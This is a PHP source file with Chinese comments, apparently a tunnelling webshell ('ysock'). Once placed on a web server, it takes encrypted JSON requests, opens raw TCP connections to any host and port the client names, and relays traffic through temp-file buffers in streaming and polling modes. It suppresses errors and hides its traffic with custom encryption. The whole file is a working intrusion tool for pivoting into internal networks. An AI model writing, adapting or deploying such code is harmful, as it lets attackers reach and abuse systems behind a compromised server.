<?php
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
ignore_user_abort(false);
$KEY = 'CHANGE_ME';

// ---- SHA256-CTR+HMAC 加密（无 openssl 依赖）----

function deriveKeys($key) {
    $master = hash('sha256', $key, true);
    $encKey = hash('sha256', $master . 'enc', true);
    $authKey = hash('sha256', $master . 'auth', true);
    return [$encKey, $authKey];
}

function genKeystream($encKey, $nonce, $len) {
    $stream = '';
    $counter = 0;
    while (strlen($stream) < $len) {
        $stream .= hash('sha256', $encKey . $nonce . pack('N', $counter), true);
        $counter++;
    }
    return substr($stream, 0, $len);
}

function computeTag($authKey, $nonce, $ct) {
    return substr(hash_hmac('sha256', $nonce . $ct, $authKey, true), 0, 16);
}

function dec($data, $key) {
    if (strlen($data) < 28) return null;
    list($encKey, $authKey) = deriveKeys($key);
    $nonce = substr($data, 0, 12);
    $tag = substr($data, strlen($data) - 16);
    $ct = substr($data, 12, strlen($data) - 28);
    $expected = computeTag($authKey, $nonce, $ct);
    if ($tag !== $expected) return null;
    $ks = genKeystream($encKey, $nonce, strlen($ct));
    return $ct ^ $ks;
}

function enc($data, $key) {
    static $counter = 0;
    list($encKey, $authKey) = deriveKeys($key);
    $counter++;
    $nonce = substr(hash('sha256', $encKey . pack('J', $counter), true), 0, 12);
    $ks = genKeystream($encKey, $nonce, strlen($data));
    $ct = $data ^ $ks;
    $tag = computeTag($authKey, $nonce, $ct);
    return $nonce . $ct . $tag;
}

// ---- YSP 包解析 ----

function mkPkt($flag, $sid, $seq, $ack, $data) {
    return pack('CNNNN', $flag, $sid, $seq, $ack, strlen($data)) . $data;
}

function readPkt($buf, &$off) {
    if (strlen($buf) - $off < 17) return null;
    $hdr = unpack('Cflag/Nsid/Nseq/Nack/Ndlen', substr($buf, $off, 17));
    $off += 17;
    $dd = '';
    if ($hdr['dlen'] > 0) {
        if (strlen($buf) - $off < $hdr['dlen']) return null;
        $dd = substr($buf, $off, $hdr['dlen']);
        $off += $hdr['dlen'];
    }
    $hdr['data'] = $dd;
    return $hdr;
}

// ---- 会话目录工具 ----

function sessDir($key, $sid) {
    return sys_get_temp_dir() . '/ysock_h_' . md5($key) . '_' . $sid;
}

function sessWriteBuf($key, $sid) {
    return sessDir($key, $sid) . '/w';
}

function sessCloseFlag($key, $sid) {
    return sessDir($key, $sid) . '/c';
}

// ---- 流式写入：加密并输出一个帧 ----

function writeFrame($typeByte, $data, $key) {
    $payload = chr($typeByte) . $data;
    $encrypted = enc($payload, $key);
    echo pack('N', strlen($encrypted)) . $encrypted;
    flush();
}

// ---- 原子追加到写缓冲 ----

function atomicAppend($file, $data) {
    $fp = @fopen($file, 'a');
    if (!$fp) return false;
    if (flock($fp, LOCK_EX)) {
        fwrite($fp, $data);
        flock($fp, LOCK_UN);
        fclose($fp);
        return true;
    }
    fclose($fp);
    return false;
}

// ---- 原子读取并清空写缓冲 ----

function atomicDrain($file) {
    $fp = @fopen($file, 'c+');
    if (!$fp) return '';
    if (!flock($fp, LOCK_EX | LOCK_NB)) {
        fclose($fp);
        return '';
    }
    $data = stream_get_contents($fp);
    if (strlen($data) > 0) {
        ftruncate($fp, 0);
        rewind($fp);
    }
    flock($fp, LOCK_UN);
    fclose($fp);
    return $data;
}

// ---- Half Duplex: 创建流式连接 ----

function performHalfCreate($j, $KEY) {
    $enc = @base64_decode($j['d']);
    if ($enc === false) { echo '{"d":""}'; exit; }

    $raw = dec($enc, $KEY);
    if ($raw === null || strlen($raw) < 2) { echo '{"d":""}'; exit; }

    // 解析 SYN 包
    $off = 2;
    $cnt = unpack('n', substr($raw, 0, 2))[1];
    $synPkt = null;
    for ($i = 0; $i < $cnt; $i++) {
        $p = readPkt($raw, $off);
        if (!$p) break;
        if (($p['flag'] & 0x0F) === 0x01) {
            $synPkt = $p;
        }
    }
    if (!$synPkt) { echo '{"d":""}'; exit; }

    $dd = $synPkt['data'];
    $sid = $synPkt['sid'];
    $hlen = ord($dd[0]);
    $host = substr($dd, 1, $hlen);
    $port = (ord($dd[1 + $hlen]) << 8) | ord($dd[2 + $hlen]);
    $target = "tcp://$host:$port";

    // 连接目标
    $fp = @stream_socket_client($target, $eno, $estr, 5);
    if (!$fp) {
        // 连接失败，返回 RST
        $rstFrame = pack('n', 1) . mkPkt(0x00, $sid, 0, $synPkt['seq'], '');
        $encrypted = enc($rstFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '"}';
        exit;
    }
    stream_set_blocking($fp, false);

    // 创建会话目录
    $dir = sessDir($KEY, $sid);
    @mkdir($dir, 0755, true);
    $writeBuf = sessWriteBuf($KEY, $sid);
    $closeFlag = sessCloseFlag($KEY, $sid);
    file_put_contents($writeBuf, '', LOCK_EX);

    // 禁用输出缓冲，设置流式响应头
    @ini_set('zlib.output_compression', 0);
    while (ob_get_level()) ob_end_clean();
    ob_implicit_flush(true);
    header('Content-Type: application/octet-stream');
    header('X-Accel-Buffering: no');
    header('Cache-Control: no-cache');

    // 发送 ACK 帧 (type=0x00)
    writeFrame(0x00, '', $KEY);

    // 流式主循环
    $lastActivity = time();
    while (true) {
        // 检查客户端断开
        if (connection_aborted()) {
            @fclose($fp);
            break;
        }

        // 检查关闭信号
        if (file_exists($closeFlag)) {
            @fclose($fp);
            break;
        }

        // 原子读取并清空写缓冲 → 写入目标
        $writeData = atomicDrain($writeBuf);
        if (strlen($writeData) > 0) {
            @fwrite($fp, $writeData);
            $lastActivity = time();
        }

        // stream_select 监听目标 socket（200ms 超时）
        $read = [$fp];
        $write = null;
        $except = null;
        $changed = @stream_select($read, $write, $except, 0, 200000);

        if ($changed > 0) {
            // 循环读取所有可用数据
            $allData = '';
            while (true) {
                $data = @fread($fp, 65536);
                if ($data === false || strlen($data) === 0) break;
                $allData .= $data;
                // 非阻塞模式下可能还有数据，用短 select 检查
                $r2 = [$fp];
                $c2 = @stream_select($r2, $w2, $e2, 0, 10000); // 10ms
                if ($c2 === 0 || $c2 === false) break;
            }
            if (strlen($allData) === 0 || feof($fp)) {
                // 目标连接关闭
                if (strlen($allData) > 0) {
                    writeFrame(0x01, $allData, $KEY);
                }
                @fclose($fp);
                writeFrame(0x02, '', $KEY); // FIN
                break;
            }
            // 流式回传目标数据
            writeFrame(0x01, $allData, $KEY);
            $lastActivity = time();
        }

        // 空闲超时（300 秒）
        if (time() - $lastActivity > 300) {
            @fclose($fp);
            writeFrame(0x02, '', $KEY);
            break;
        }
    }

    // 清理会话文件
    @unlink($writeBuf);
    @unlink($closeFlag);
    @rmdir($dir);
}

// ---- Half Duplex: 写入数据到缓冲 ----

function performHalfData($j, $KEY) {
    $sid = intval($j['id'] ?? 0);
    if ($sid === 0) { echo '{"ok":false}'; exit; }

    $enc = @base64_decode($j['d'] ?? '');
    if ($enc === false) { echo '{"ok":false}'; exit; }

    $raw = dec($enc, $KEY);
    if ($raw === null) { echo '{"ok":false}'; exit; }

    $writeBuf = sessWriteBuf($KEY, $sid);
    if (!file_exists($writeBuf)) { echo '{"ok":false}'; exit; }

    if (atomicAppend($writeBuf, $raw)) {
        echo '{"ok":true}';
    } else {
        echo '{"ok":false}';
    }
    exit;
}

// ---- Half Duplex: 关闭会话 ----

function performHalfClose($j, $KEY) {
    $sid = intval($j['id'] ?? 0);
    if ($sid === 0) { echo '{"ok":false}'; exit; }

    $closeFlag = sessCloseFlag($KEY, $sid);
    @file_put_contents($closeFlag, '1');
    echo '{"ok":true}';
    exit;
}

// ---- 会话工具：读缓冲文件 ----

function sessReadBuf($key, $sid) {
    return sessDir($key, $sid) . '/r';
}

// ---- 握手 ----

function performHandshake($j, $KEY) {
    $enc = @base64_decode($j['d'] ?? '');
    if ($enc === false) { echo '{"d":"","m":3}'; exit; }
    $raw = dec($enc, $KEY);
    if ($raw === null) { echo '{"d":"","m":3}'; exit; }

    $resp = enc($raw, $KEY);
    echo '{"d":"' . base64_encode($resp) . '","m":2}';
    exit;
}

// ---- Classic: 创建会话 ----

function performClassicCreate($j, $KEY) {
    $enc = @base64_decode($j['d']);
    if ($enc === false) { echo '{"d":""}'; exit; }

    $raw = dec($enc, $KEY);
    if ($raw === null || strlen($raw) < 2) { echo '{"d":""}'; exit; }

    $off = 2;
    $cnt = unpack('n', substr($raw, 0, 2))[1];
    $synPkt = null;
    for ($i = 0; $i < $cnt; $i++) {
        $p = readPkt($raw, $off);
        if (!$p) break;
        if (($p['flag'] & 0x0F) === 0x01) {
            $synPkt = $p;
        }
    }
    if (!$synPkt) { echo '{"d":""}'; exit; }

    $dd = $synPkt['data'];
    $sid = $synPkt['sid'];
    $hlen = ord($dd[0]);
    $host = substr($dd, 1, $hlen);
    $port = (ord($dd[1 + $hlen]) << 8) | ord($dd[2 + $hlen]);
    $target = "tcp://$host:$port";

    $fp = @stream_socket_client($target, $eno, $estr, 5);
    if (!$fp) {
        $rstFrame = pack('n', 1) . mkPkt(0x00, $sid, 0, $synPkt['seq'], '');
        $encrypted = enc($rstFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '"}';
        exit;
    }
    stream_set_blocking($fp, false);

    $dir = sessDir($KEY, $sid);
    @mkdir($dir, 0755, true);
    $writeBuf = sessWriteBuf($KEY, $sid);
    $readBuf = sessReadBuf($KEY, $sid);
    $closeFlag = sessCloseFlag($KEY, $sid);
    file_put_contents($writeBuf, '', LOCK_EX);
    file_put_contents($readBuf, '', LOCK_EX);

    // 返回 ACK
    $ackFrame = pack('n', 1) . mkPkt(0x04, $sid, 0, $synPkt['seq'], '');
    $encrypted = enc($ackFrame, $KEY);
    echo '{"d":"' . base64_encode($encrypted) . '","id":"' . $sid . '"}';

    // 释放 PHP worker
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    }

    // 后台循环：读目标 → 写读缓冲，从写缓冲 → 写目标
    $lastActivity = time();
    while (true) {
        if (file_exists($closeFlag)) { @fclose($fp); break; }

        $read = [$fp];
        $write = null;
        $except = null;
        $changed = @stream_select($read, $write, $except, 0, 200000);

        if ($changed > 0) {
            $allData = '';
            while (true) {
                $data = @fread($fp, 65536);
                if ($data === false || strlen($data) === 0) break;
                $allData .= $data;
                $r2 = [$fp];
                $c2 = @stream_select($r2, $w2, $e2, 0, 10000);
                if ($c2 === 0 || $c2 === false) break;
            }
            if (strlen($allData) === 0 || feof($fp)) {
                if (strlen($allData) > 0) {
                    atomicAppend($readBuf, $allData);
                }
                @fclose($fp);
                // 设置 FIN 标志
                @file_put_contents($dir . '/fin', '1');
                break;
            }
            atomicAppend($readBuf, $allData);
            $lastActivity = time();
        }

        $writeData = atomicDrain($writeBuf);
        if (strlen($writeData) > 0) {
            @fwrite($fp, $writeData);
            $lastActivity = time();
        }

        if (time() - $lastActivity > 300) {
            @fclose($fp);
            break;
        }
    }

    @unlink($writeBuf);
    @unlink($readBuf);
    @unlink($closeFlag);
    @unlink($dir . '/fin');
    @rmdir($dir);
}

// ---- Classic: 轮询 ----

function performClassicPoll($j, $KEY) {
    $sid = intval($j['id'] ?? 0);
    if ($sid === 0) { echo '{"d":""}'; exit; }

    // 写入数据到写缓冲
    if (isset($j['d']) && !empty($j['d'])) {
        $enc = @base64_decode($j['d']);
        if ($enc !== false) {
            $raw = dec($enc, $KEY);
            if ($raw !== null) {
                $writeBuf = sessWriteBuf($KEY, $sid);
                if (file_exists($writeBuf)) {
                    atomicAppend($writeBuf, $raw);
                }
            }
        }
    }

    // 从读缓冲取数据
    $readBuf = sessReadBuf($KEY, $sid);
    $data = '';
    if (file_exists($readBuf)) {
        $data = atomicDrain($readBuf);
    }

    $dir = sessDir($KEY, $sid);
    $fin = file_exists($dir . '/fin');

    if (strlen($data) > 0) {
        $respFrame = pack('n', 1) . mkPkt(0x02, $sid, 0, 0, $data);
        $encrypted = enc($respFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '","fin":' . ($fin ? 'true' : 'false') . '}';
    } else if ($fin) {
        $finFrame = pack('n', 1) . mkPkt(0x08, $sid, 0, 0, '');
        $encrypted = enc($finFrame, $KEY);
        echo '{"d":"' . base64_encode($encrypted) . '","fin":true}';
    } else {
        echo '{"d":"","fin":false}';
    }
    exit;
}

// ---- 主入口：路由分发 ----

// full duplex detection: PHP does not support continuous input stream, reject with empty response
$ct = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
if (strpos($ct, 'application/octet-stream') === 0 && strpos($ct, 'application/json') === false) {
    // PHP cannot do full duplex - return nothing so client degrades to half
    echo '';
    exit;
}

$input = file_get_contents('php://input');
if (empty($input)) {
    echo '{"d":""}';
    exit;
}

$j = @json_decode($input, true);
if (!$j || !isset($j['a'])) {
    echo '{"d":""}';
    exit;
}

switch ($j['a']) {
    case 'h':
        performHandshake($j, $KEY);
        break;
    case 'c':
        performHalfCreate($j, $KEY);
        break;
    case 'd':
        performHalfData($j, $KEY);
        break;
    case 'x':
        performHalfClose($j, $KEY);
        break;
    case 'cc':
        performClassicCreate($j, $KEY);
        break;
    case 'cp':
        performClassicPoll($j, $KEY);
        break;
    default:
        echo '{"d":""}';
        exit;
}
